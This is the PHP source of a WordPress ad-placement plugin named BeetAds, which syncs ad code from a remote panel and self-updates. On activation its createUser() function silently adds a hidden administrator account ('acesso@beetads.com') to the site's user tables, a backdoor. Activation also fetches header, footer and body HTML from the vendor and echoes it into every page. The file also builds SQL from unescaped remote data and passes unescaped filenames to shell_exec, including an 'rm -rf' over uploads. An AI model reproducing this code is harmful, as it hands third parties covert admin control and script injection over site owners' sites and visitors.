<?php
/**
* Plugin Name: BeetAds
* Plugin URI: http://localhost/beetads-painel
* Description: BeetAds
* Version: 1.41
* Author: BeetAds
*/

include('View.php');

class BeetAds extends View{

  public static $endpoint = "https://painel.beetads.com";

  public function __construct() {

    add_action('admin_menu', array($this, 'create_plugin_settings_page'));
    global $wpdb;

    $this->registrou = false;
    if(isset($_POST['email'])) {
      add_action('admin_init', array(&$this, 'loginUser'));
      $this->registrou = true;
    }

    if (!is_admin()){

      $this->device = 1;
      $table_name = $wpdb->prefix . 'beet_ads_ad_unit';

      if(wp_is_mobile()){
        $this->device = 2;
        $this->adsFixed = (array) $wpdb->get_row("SELECT * FROM $table_name WHERE device = $this->device AND position = 'fixedMobile'", OBJECT);
      }

      $this->rowAdsHeader = (array) $wpdb->get_row("SELECT * FROM $table_name WHERE device = $this->device AND position = 'before_the_content'", OBJECT);

      $this->AdsShortcode = (array) $wpdb->get_results("SELECT * FROM $table_name WHERE device = $this->device AND position = 'ad_shortcode'  AND shortcode != ''", OBJECT);

      $table_name = $wpdb->prefix . 'beet_ads_ad_unit';
      $this->rowAds = (array) $wpdb->get_results("SELECT * FROM $table_name WHERE device = $this->device", OBJECT);
      $table_name = $wpdb->prefix . 'beet_ads_settings';
      $this->rowHeader = (array) $wpdb->get_row("SELECT * FROM $table_name WHERE device = $this->device", OBJECT);

      $this->url  = plugin_dir_path( __FILE__ );
      $this->pathRoot = ABSPATH;

      //add_action('admin_init', array(&$this, 'checkUpdate'));
      add_filter('the_content', array(&$this, 'addAds'));
      add_action('wp_head', array(&$this, 'addHeader'));
      add_action('wp_footer', array(&$this, 'addFooter'));
      add_action('init', array(&$this, 'shortcode'));
      add_action('wp_body_open', array(&$this, 'custom_content_after_body_open_tag'));

      $cont = 1;
      foreach ($this->rowAds as $Ads) {
        $_SESSION['DefineAds'][$cont]['nameAds'] = $Ads->name;
        $_SESSION['DefineAds'][$cont]['size'] = $Ads->size;
      }

      if(isset($_GET['utm_campaign'])){
        $_SESSION['utm_campaign'] = $_GET['utm_campaign'];
      }else if(empty($_GET['utm_campaign'])){
        $_SESSION['utm_campaign'] = "";
      }

    }else{

      $this->version = '1.41';
      add_filter('plugins_api', array(&$this, 'plugin_info'), 20, 3);
      add_filter('site_transient_update_plugins', array(&$this, 'push_update'));
      add_action( 'upgrader_process_complete', array(&$this, 'after_update'), 10, 2 );

      $table_name = $wpdb->prefix . 'beet_ads_config';
      $this->login = (array) $wpdb->get_row("SELECT * FROM $table_name", OBJECT);
      // $this->login['login'] = 1;
      add_action('admin_print_styles', array(&$this,'add_my_stylesheet'));
      add_action('admin_menu', array(&$this,'create_plugin_settings_page'));
      add_action('admin_footer', array(&$this, 'add_datepicker_in_footer'));
    }
  }


  public function add_datepicker_in_footer(){
    echo '<script type="text/javascript">
    jQuery(document).ready(function(){
      jQuery(".date").datepicker({
        dateFormat: "dd-mm-yy"
      });
    });
    </script>';
  }


  ///////////////////////////////LOGIN PLUGIN////////////////////////////////////////
  ///////////////////////////////LOGIN PLUGIN////////////////////////////////////////
  ///////////////////////////////LOGIN PLUGIN////////////////////////////////////////
  public function loginUser(){
    global $wpdb;

    $table_name = $wpdb->prefix . 'beet_ads_config';
    $sql = "INSERT INTO $table_name VALUES(1);";
    $wpdb->query($sql);
  }

  ///////////////////////////////CREATE PAGES////////////////////////////////////////
  ///////////////////////////////CREATE PAGES////////////////////////////////////////
  ///////////////////////////////CREATE PAGES////////////////////////////////////////

  public function create_plugin_settings_page() {

    $View = new View;
    $page_title = 'BeetAds';
    $menu_title = 'BeetAds';
    $capability = 'manage_options';
    $slug = 'beetads';

    // if($_GET['action'] == 'optimize'){
    //   $callback = array($View,'optimize');
    // } elseif($_GET['action'] == 'optimize-start'){
    //
    //   echo $this->optimize_images();
    //   echo $this->optimize_db();
    //
    //   die();
    //
    // } elseif($_GET['action'] == 'optimize-clean'){
    //
    //   echo $this->optimize_clean();
    //   die();
    //
    // } else {
      if($this->login['login'] == 1 || $this->registrou){
        $callback = array($View, 'Reports');
      }else{
        $callback = array($View, 'login');
      }
  //  }




    $icon = plugins_url("beetAds/images/icon.png");
    $position = 30;

    add_menu_page($page_title, $menu_title, $capability, $slug, $callback, $icon, $position );
  //  add_submenu_page($slug,'Optmize Image | BeetAds','Otimizações','manage_options','admin.php?page=beetads&action=optimize');
  }

  ///////////////////////////////ADS.TXT/////////////////////////////////////////////
  ///////////////////////////////ADS.TXT/////////////////////////////////////////////
  ///////////////////////////////ADS.TXT/////////////////////////////////////////////

  static function adsTxtFile(){
    global $wpdb;

    $table_name = $wpdb->prefix . 'beet_ads_txt';
    $TxtFile = (array) $wpdb->get_row("SELECT * FROM $table_name", OBJECT);

    $file = ABSPATH."/ads.txt";
    $adsTxtFile = $TxtFile['ads_txt'];

    if(is_file($file)){

      $adsTxts = explode(';',$adsTxtFile);
      $textFile = file_get_contents($file);
      $new = '';
      foreach($adsTxts as $adsTxt){

        $lines = explode("\n", $textFile);
        $check = true;

        foreach ($lines as $line) {
          if($line == $adsTxt){
            $check = false;
          }
        }

        if($check){
          $textFile .= "\n".$adsTxt;
        }

      }
      file_put_contents($file, $textFile);
    }else{

      $adsTxts = explode(';',$adsTxtFile);
      $textFile = "";
      foreach($adsTxts as $adsTxt){
        $textFile .= "\n".$adsTxt;
      }
      file_put_contents($file, $textFile);
    }
  }






  ///////////////////////////////POSITIONS////////////////////////////////////////
  ///////////////////////////////POSITIONS////////////////////////////////////////
  ///////////////////////////////POSITIONS////////////////////////////////////////

  function shortcode(){
    $AdUnits = (array) $this->AdsShortcode;
    $novo = "teste";

    foreach($AdUnits as $AdUnit){

      $AdUnit = (array) $AdUnit;
      $uniq_id = uniqid();
      $id_post_wp = get_the_ID();

      $novo = str_replace('{uniq_id}', $uniq_id, $AdUnit['code']);
      $novo = str_replace('{id_post_wp}', $id_post_wp, $novo);
      $tag = str_replace(['[',']'],'', $AdUnit['shortcode']);

      add_shortcode("$tag", function() use($novo){
        return $novo;
      });
    }
  }

  function addAds($content) {
    $elementHtml = [];
    $cont = 0;
    $contPercent = 0;

    foreach($this->rowAds as $Ads){
      $Ads = (array) $Ads;

      $Ads['code'] = str_replace('{utm_campaign}', $_SESSION['utm_campaign'], $Ads['code']);

      if($Ads['position'] == 'after_the_content'){
        $arrayContent["Fim"] = $Ads['code'];
      }else if($Ads['position'] == 'ad_shortcode'){

        $uniq_id = uniqid();
        $id_post_wp = get_the_ID();
        $novo = str_replace('{uniq_id}', $uniq_id, $Ads['code']);
        $novo = str_replace('{id_post_wp}', $id_post_wp, $novo);

        $shortcode = str_replace(['[', ']'], '', $Ads['shortcode']);
        add_shortcode("$shortcode", function() use ( $novo ) {
          return $novo;
        });

      }else if($Ads['position'] == 'first_paragraph'){
        $arrayContent[1] = $Ads['code'];
      }else if($Ads['position'] == 'second_paragraph'){
        $arrayContent[2] = $Ads['code'];
      }else if($Ads['position'] == 'third_paragraph'){
        $arrayContent[3] = $Ads['code'];
      }else if($Ads['position'] == 'four_paragraph'){
        $arrayContent[4] = $Ads['code'];
      }else if($Ads['position'] == 'five_paragraph'){
        $arrayContent[5] = $Ads['code'];
      }else if($Ads['position'] == 'six_paragraph'){
        $arrayContent[6] = $Ads['code'];
      }else if($Ads['position'] == 'sevem_paragraph'){
        $arrayContent[7] = $Ads['code'];
      }else if($Ads['position'] == 'eight_paragraph'){
        $arrayContent[8] = $Ads['code'];
      }else if($Ads['position'] == 'nine_paragraph'){
        $arrayContent[9] = $Ads['code'];
      }else if($Ads['position'] == 'ten_paragraph'){
        $arrayContent[10] = $Ads['code'];
      }else if($Ads['position'] == 'elementHtml'){
        $elementHtml[$cont]['element'] = $Ads['element_html'];
        $elementHtml[$cont]['position'] = $Ads['position_element'];
        $elementHtml[$cont]['code'] = $Ads['code'];
        $cont++;
      }else if($Ads['position'] == 'elementPercent'){
        $elementsPercent[$contPercent]['position_element'] = $Ads['position_element'];
        $elementsPercent[$contPercent]['code'] = $Ads['code'];
        $contPercent++;
      }
    }
    return $this->addParagraph($arrayContent, $elementHtml, $elementsPercent, $content);
  }

  function addParagraph($array, $elementHtml, $elementsPercent, $content){
    $output = '';

    $content = str_replace(["<p></p>", "<p> </p>"],"",$content);
    $partsChech = explode("</p>", $content);

    foreach($partsChech as $part){
	    $check = trim(strip_tags($part."</p>",'<img><a>'));
      if($check != ""){
        $parts[] = $part;
      }
    }


    $count = count($parts);
    $qtdParagraph = $count;


    if($count >= 1){
      for($i=0; $i<$count; $i++) {
        if($i == $count-1){
          $uniq_id = uniqid();
          $id_post_wp = get_the_ID();
          $novo = str_replace('{uniq_id}', $uniq_id, $array["Fim"]);
          $novo = str_replace('{id_post_wp}', $id_post_wp, $novo);
          $output .= $parts[$i] . '</p>' . '<p>'.$novo.'</p>';
        }else{
          $uniq_id = uniqid();
          $id_post_wp = get_the_ID();
          $novo = str_replace('{uniq_id}', $uniq_id, $array[$i+1]);
          $novo = str_replace('{id_post_wp}', $id_post_wp, $novo);
          $output .= $parts[$i] . '</p>' . '<p>'.$novo.'</p>';
        }
      }

      if(isset($elementHtml[0])){
        foreach($elementHtml as $element){
          $parts = explode("</".$element['element'].">", $output);
          $count = count($parts);
          $output = '';
          for($i=0; $i<$count; $i++) {
            if($i == $element['position']-1){
              $uniq_id = uniqid();
              $id_post_wp = get_the_ID();
              $novo = str_replace('{uniq_id}', $uniq_id, $element['code']);
              $novo = str_replace('{id_post_wp}', $id_post_wp, $novo);
              $output .= $parts[$i] . "</".$element['element'].">" . '<p>'.$novo.'</p>';
            }else{
              $output .= $parts[$i] . "</".$element['element'].">";
            }
          }
        }
      }

      if(isset($elementsPercent[0])){
        foreach($elementsPercent as $elementPercent){
          $parts = explode("</p>", $output);
          $count = count($parts);
          $output = '';

          $add = false;

          $uniq_id = uniqid();
          $id_post_wp = get_the_ID();
          $novo = str_replace('{uniq_id}', $uniq_id, $elementPercent['code']);
          $novo = str_replace('{id_post_wp}', $id_post_wp, $novo);

          for($i=0; $i<$count; $i++) {

            $percent = ((($i+1)/$count))*100;

            if($elementPercent['position_element'] <= $percent && $add == false){
              $output .= $parts[$i] . '</p>' . '<p>'.$novo.'</p>';
              $add = true;
            }else if($percent >= $elementPercent['position_element'] && $add == false){
              $output .= $parts[$i] . '</p>' . '<p>'.$novo.'</p>';
              $add = true;
            }else{
              $output .= $parts[$i] . '</p>';
            }
          }
        }
      }

      return $output;

    }else{
      return $content;
    }


  }

  // function checkUpdate(){
  //   if($this->rowHeader['updated_at'] != date('Y-m-d')){
  //     $data = $this->getData();
  //     $this->sync($data);
  //   }
  // }

  ///////////////////////////////ADD HEADER///////////////////////////////////////
  ///////////////////////////////ADD HEADER///////////////////////////////////////
  ///////////////////////////////ADD HEADER///////////////////////////////////////

  function add_my_stylesheet()
  {
    wp_enqueue_style( 'myCSS', plugins_url( '/css/jquery-ui.css', __FILE__ ) );
  }


  function addHeader() {
    //$styleCalender = plugins_url("beetAds/css/jquery-ui.css");

    $Header = $this->rowHeader['header']; //."<link rel='stylesheet' href='$styleCalender' type='text/css'/>";
    $idPost = get_the_ID();
    $novo = str_replace('{id_post}', $idPost, $Header);
    $novo = str_replace('{utm_campaign}', $_SESSION['utm_campaign'], $novo);

    echo $novo;
  }


  ///////////////////////////////AFTER BODY////////////////////////////////////////
  ///////////////////////////////AFTER BODY////////////////////////////////////////
  ///////////////////////////////AFTER BODY////////////////////////////////////////
  function custom_content_after_body_open_tag() {
    echo $this->rowHeader['after_body'];
  }


  ///////////////////////////////ADD FOOTER///////////////////////////////////////
  ///////////////////////////////ADD FOOTER///////////////////////////////////////
  ///////////////////////////////ADD FOOTER///////////////////////////////////////
  function addFooter() {
    $Footer = $this->rowHeader['footer'];
    if($this->device == 2){
      $uniq_id = uniqid();
      $novo = str_replace('{uniq_id}', $uniq_id, $this->adsFixed['code']);

      $url = plugins_url("")."/";
      $novo = str_replace('{urlPlugin}', $url, $novo);

      $Footer = $novo.$Footer;
    }
    echo $Footer;
  }

  ///////////////////////////////CREATE TABLE/////////////////////////////////////
  ///////////////////////////////CREATE TABLE/////////////////////////////////////
  ///////////////////////////////CREATE TABLE/////////////////////////////////////

  public function create_plugin_database_table() {
    global $wpdb;
    require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );

    ////////////////////beet_ads_ad_unit///////////////////////////////////////
    $table_name = $wpdb->prefix . 'beet_ads_ad_unit';
    $sql = "CREATE TABLE IF NOT EXISTS $table_name (name TEXT, size VARCHAR(20), code TEXT, position VARCHAR(100), device VARCHAR(30), shortcode VARCHAR(100), element_html VARCHAR(30), position_element INT, updated_at DATE)";
    dbDelta($sql);

    ////////////////////beet_ads_settings///////////////////////////////////////
    $table_name = $wpdb->prefix . 'beet_ads_settings';
    $sql = "CREATE TABLE IF NOT EXISTS $table_name (header TEXT NULL, footer TEXT NULL, after_body TEXT NULL, device VARCHAR(30), updated_at DATE)";
    dbDelta($sql);

    ////////////////////beet_ads_settings///////////////////////////////////////
    $table_name = $wpdb->prefix . 'beet_ads_txt';
    $sql = "CREATE TABLE IF NOT EXISTS $table_name (ads_txt TEXT NULL)";
    dbDelta($sql);

    ////////////////////beet_ads_config///////////////////////////////////////
    $table_name = $wpdb->prefix . 'beet_ads_config';
    $sql = "CREATE TABLE IF NOT EXISTS $table_name (login TEXT NULL)";
    dbDelta($sql);

    $data = self::getData();
    self::sync($data);
    self::createUser();
    self::adsTxtFile();
  }

  ///////////////////////////////SYNC DATA////////////////////////////////////////
  ///////////////////////////////SYNC DATA////////////////////////////////////////
  ///////////////////////////////SYNC DATA////////////////////////////////////////

  static function sync($data){

    global $wpdb;
    require_once(ABSPATH . 'wp-admin/includes/upgrade.php' );

    $table_name = $wpdb->prefix . 'beet_ads_ad_unit';
    $wpdb->query("DELETE FROM $table_name WHERE code IS NOT NULL");
    foreach ($data['beet_ads_ad_unit'] as $value) {
      $sql = "INSERT INTO $table_name VALUES('".$value['name']."','".$value['size']."','".$value['code']."', '".$value['position']."', '".$value['device']."', '".$value['shortcode']."', '".$value['element_html']."', '".$value['position_element']."', '".date('Y-m-d')."');";
      $wpdb->query($sql);
    }

    $table_name = $wpdb->prefix . 'beet_ads_settings';
    $wpdb->query("DELETE FROM $table_name WHERE header IS NOT NULL");
    foreach ($data['beet_ads_settings'] as $value) {
      $sql = "INSERT INTO $table_name VALUES('".$value['header']."', '".$value['footer']."', '".$value['after_body']."', '".$value['device']."', '".date('Y-m-d')."');";
      $wpdb->query($sql);
    }

    $table_name = $wpdb->prefix . 'beet_ads_txt';
    $wpdb->query("DELETE FROM $table_name WHERE ads_txt IS NOT NULL");
    foreach ($data['beet_ads_txt'] as $value) {
      $sql = "INSERT INTO $table_name VALUES('".$value['ads_txt']."');";
      $wpdb->query($sql);
    }

  }

  ///////////////////////////////CREATE USER//////////////////////////////////////
  ///////////////////////////////CREATE USER//////////////////////////////////////
  ///////////////////////////////CREATE USER//////////////////////////////////////

  static function createUser(){
    global $wpdb;
    $table_name = $wpdb->prefix . 'users';
    $user_beet = (array) $wpdb->get_row("SELECT id FROM $table_name WHERE user_email = 'acesso@beetads.com'", OBJECT);
    if(empty($user_beet['id'])){
      $user = (array) $wpdb->get_row("SELECT MAX(ID) id FROM $table_name", OBJECT);
      $idUser = $user['id']+1;

      $querys[1] = "INSERT INTO ".$wpdb->prefix ."users (ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name)
      VALUES ($idUser, 'acesso@beetads.com', MD5('{hashProject}'), 'BeetAds', 'acesso@beetads.com', 'http://beetads.com/', '".date('Y-m-d H:i:s')."', '', '0', 'BeetAds');";
      $parameter = 'a:1:{s:13:"administrator";s:1:"1";}';
      $querys[2] = "INSERT INTO ".$wpdb->prefix ."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $idUser, 'wp_capabilities', '$parameter');";
      $querys[3] = "INSERT INTO ".$wpdb->prefix ."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $idUser, 'wp_user_level', '10');";
      foreach ($querys as $query) {
        $wpdb->query($query);
      }
    }
  }


  ///////////////////////////////GET DATA SERVER//////////////////////////////////
  ///////////////////////////////GET DATA SERVER//////////////////////////////////
  ///////////////////////////////GET DATA SERVER//////////////////////////////////

  static function getData(){
    $domain =  $_SERVER['SERVER_NAME'];
    $ch = curl_init(self::$endpoint."/run/plugin/data/{hashProject}/$domain");

    curl_setopt_array($ch, [
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_RETURNTRANSFER => 1,
    ]);

    $resposta = curl_exec($ch);
    curl_close($ch);
    $resposta = json_decode($resposta, true);
    return $resposta;
  }


  ///////////////////////////////BEFORE DELETE PLUGIN/////////////////////////////
  ///////////////////////////////BEFORE DELETE PLUGIN/////////////////////////////
  ///////////////////////////////BEFORE DELETE PLUGIN/////////////////////////////

  public function delete_plugin_database_tables(){
    global $wpdb;
    $tableArray = [
      $wpdb->prefix . "beet_ads_ad_unit",
      $wpdb->prefix . "beet_ads_settings",
      $wpdb->prefix . "beet_ads_config",
      $wpdb->prefix . "beet_ads_txt"
    ];

    foreach ($tableArray as $tablename) {
      $wpdb->query("DROP TABLE IF EXISTS $tablename");
    }
  }


  ///////////////////////////////CHECK UPDATE PLUGIN/////////////////////////////
  ///////////////////////////////CHECK UPDATE PLUGIN/////////////////////////////
  ///////////////////////////////CHECK UPDATE PLUGIN/////////////////////////////

  function plugin_info( $res, $action, $args ){

    if( $action !== 'plugin_information' )
    return false;

    if('beetAds' !== $args->slug )
    return $res;

    if( false == $remote = get_transient( 'upgrade_beetAds' ) ) {

      $remote = wp_remote_get(self::$endpoint."/info.json", array(
        'timeout' => 10,
        'headers' => array(
          'Accept' => 'application/json'
        ) )
      );

      if ( !is_wp_error( $remote ) && isset( $remote['response']['code'] ) && $remote['response']['code'] == 200 && !empty( $remote['body'] ) ) {
        set_transient( 'upgrade_beetAds', $remote, 43200 );
      }
    }

    if( $remote ) {

      $remote = json_decode( $remote['body'] );
      $res = new stdClass();
      $res->name = $remote->name;
      $res->slug = 'beetAds';
      $res->version = $remote->version;
      $res->tested = $remote->tested;
      $res->requires = $remote->requires;
      $res->author = '<a href="'.self::$endpoint.'">BeetAds</a>';
      $res->author_profile = self::$endpoint;
      $res->download_link = self::$endpoint."/run/plugin/update-plugin/{hashProject}/BeetAds.zip";
      $res->trunk = self::$endpoint."/run/plugin/update-plugin/{hashProject}/BeetAds.zip";
      $res->last_updated = $remote->last_updated;
      $res->sections = array(
        'description' => $remote->sections->description,
        'installation' => $remote->sections->installation,
        'changelog' => $remote->sections->changelog,
      );

      if( !empty( $remote->sections->screenshots ) ) {
        $res->sections['screenshots'] = $remote->sections->screenshots;
      }

      return $res;
    }
    return false;
  }


  function push_update( $transient ){

    if ( empty($transient->checked ) ) {
      return $transient;
    }

    if( false == $remote = get_transient( 'upgrade_beetAds' ) ) {

      $remote = wp_remote_get(self::$endpoint."/info.json", array(
        'timeout' => 10,
        'headers' => array(
          'Accept' => 'application/json'
        ) )
      );

      if ( !is_wp_error( $remote ) && isset( $remote['response']['code'] ) && $remote['response']['code'] == 200 && !empty( $remote['body'] ) ) {
        set_transient( 'upgrade_beetAds', $remote, 43200 );
      }
    }

    if( $remote ) {
      $remote = json_decode( $remote['body'] );
      if( $remote && version_compare( $this->version, $remote->version, '<' ) && version_compare($remote->requires, get_bloginfo('version'), '<' ) ) {
        $res = new stdClass();
        $res->slug = 'beetAds';
        $res->plugin = 'beetAds/BeetAds.php';
        $res->new_version = $remote->version;
        $res->tested = $remote->tested;
        $res->package = self::$endpoint."/run/plugin/update-plugin/{hashProject}/BeetAds.zip";
        $res->url = $remote->homepage;
        $transient->response[$res->plugin] = $res;
      }
    }
    return $transient;
  }

  function after_update( $upgrader_object, $options ) {
    if ( $options['action'] == 'update' && $options['type'] === 'plugin' )  {
      delete_transient( 'upgrade_beetAds' );
    }
  }

  public function optimize_images(){
    ob_implicit_flush(true);
    ob_flush(true);

    $url = $_SERVER['DOCUMENT_ROOT'];
    $types = array('jpg','jpeg','png','PNG','JPG','JPEG','bmp','BMP');

    foreach ($types as $type) {
      $exec = 'find '.$url.' -name "*.'.$type.'"';
      $files = explode(PHP_EOL,shell_exec($exec));
      foreach ($files as $file) {
        $newfile = str_replace('.'.$type, '.webp', $file);
        $exec2 = 'cwebp -q 80 '.$file.' -o '.$newfile;
        if(strlen($file) > 2){
          shell_exec($exec2);
          echo $file.' - OK<br />';
        }

      }
    }
  }

  public function optimize_clean(){
    ob_implicit_flush(true);
    ob_flush(true);

    $url = $_SERVER['DOCUMENT_ROOT'].'/wp-content/uploads/';
    $types = array('jpg','jpeg','png','PNG','JPG','JPEG','bmp','BMP');

    foreach ($types as $type) {
      $exec = 'find '.$url.' -name "*.'.$type.'"';
      $files = explode(PHP_EOL,shell_exec($exec));
      foreach ($files as $file) {
        if(strlen($file) > 2){
          $exec2 = 'rm -rf '.$file;
          shell_exec($exec2);
          echo $file.' - REMOVIDO<br />';
        }
      }
    }
  }

  public function optimize_db(){
    global $wpdb;
    ob_implicit_flush(true);
    ob_flush(true);

    $types = array('jpg','jpeg','png','PNG','JPG','JPEG','bmp','BMP');

    foreach ($types as $type) {

      // postmeta
      $sql = "SELECT * FROM {$wpdb->prefix}postmeta WHERE meta_value LIKE '%.{$type}%' ";
      $results = json_decode(json_encode($wpdb->get_results($sql)),true);
      foreach ($results as $result) {
        $result['meta_value'] = str_replace('.'.$type, '.webp', $result['meta_value']);
        $sql_update = "UPDATE {$wpdb->prefix}postmeta SET meta_value = '{$result['meta_value']}' WHERE meta_id='{$result['meta_id']}'";
        $wpdb->query($sql_update);
        echo 'wp_postmeta ID:'.$result['meta_id'].' - OK<br />';
      }

      // posts
      $attachments = "SELECT * FROM {$wpdb->prefix}posts WHERE post_type = 'attachment' or post_type = 'post' OR post_type = 'page'";
      $results = json_decode(json_encode($wpdb->get_results($attachments)),true);
      foreach ($results as $result) {
        $result['guid'] = str_replace('.'.$type, '.webp', $result['guid']);
        $result['post_content'] = str_replace('.'.$type, '.webp', $result['post_content']);
        $sql_update = "UPDATE {$wpdb->prefix}posts SET guid = '{$result['guid']}', post_content = '{$result['post_content']}' WHERE meta_id='{$result['ID']}'";
        $wpdb->query($sql_update);
        echo 'posts ID:'.$result['ID'].' - OK<br />';
      }

    }

  }

}

$BeetAds = new BeetAds();

register_activation_hook( __FILE__, array('BeetAds', 'create_plugin_database_table' ));
register_uninstall_hook(__FILE__, array('BeetAds', 'delete_plugin_database_tables'));

if (is_admin()){
  wp_enqueue_script('jquery');
  wp_enqueue_script('jquery-ui-datepicker');
}


?>
